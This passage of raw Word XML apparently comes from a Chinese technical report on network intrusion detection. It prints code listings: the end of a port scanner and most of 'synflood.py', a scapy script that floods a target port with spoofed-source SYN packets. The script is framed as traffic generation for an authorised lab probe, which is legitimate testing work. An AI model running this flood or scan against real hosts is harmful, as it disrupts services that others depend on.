        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i, port in enumerate(ports):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115116C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if time.monotonic() - started &gt; args.duration:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41491642">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(f"[扫描] 到达时长上限，已发 {i} 个", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673053E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7344F516">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBE26A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sock.settimeout(0.15)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6716F8E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656FF7CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if sock.connect_ex((args.target, port)) == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0462063E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                opened.append(port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0ADEC8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F58844C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            sock.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031FA224">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        pace(args.rate, i + 1, started)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="365434DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5408C51F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[扫描] 完成，开放端口：{opened or '（无）'}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5912DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D905E1A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18C21742">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D38259E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B61F269">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise SystemExit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4098D075">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D242F75">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-12　attack/synflood.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（47 行）　M7 SYN 洪泛（仅限授权网段）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2705DB53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""SYN 洪泛复现（**仅限本人授权实验网段**）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63928899">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14FCA55B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>用伪造源地址发送 SYN，模拟半连接队列被打满的情形。源地址用目标网段内随机地址，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6C5940">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>这样探针看到的是"大量不同源、每条流只有 1 个 SYN 包"——正是 SYN 洪泛的典型形态。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409CB428">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335593C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A4E126A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55682C4D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49A85678">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366D0CE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import random</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0268D31F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126B304A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5587D8FD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DF9634">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69DF5B18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sys.path.insert(0, str(Path(__file__).resolve().parent.parent))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8A7A00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from attack.common import add_common_args, guard, pace, require_root  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187A3C1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18D70A05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="480D6252">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def main(argv=None) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DE6310">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap = argparse.ArgumentParser(description="SYN 洪泛（仅限授权实验网段）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D4277B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    add_common_args(ap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A505D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--spoof-prefix", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF57733">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    help="伪造源地址前缀，如 10.0.0.（默认沿用目标所在 /24）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340943E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    args = ap.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FDD0767">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    guard(ap, args)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D1249D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    require_root()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="568000D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="559D9D40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from scapy.all import IP, TCP, send</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210D0636">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77AD5145">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    prefix = args.spoof_prefix or args.target.rsplit(".", 1)[0] + "."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13AC1798">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rng = random.Random(42)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12ACA478">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    started = time.monotonic()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFCC01F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sent = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249C6A15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[SYN] -&gt; {args.target}:{args.port}　伪造源 {prefix}x，速率 {args.rate}/s", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="642BDDFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    while time.monotonic() - started &lt; args.duration:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136B896F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sport = rng.randint(1024, 65535)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28748E36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        pkt = IP(src=f"{prefix}{rng.randint(2, 254)}", dst=args.target) / \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BA8BEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">              TCP(sport=sport, dport=args.port, flags="S", seq=rng.randint(0, 2**32 - 1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322E46F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        send(pkt, verbose=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0209A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sent += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4DDADA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
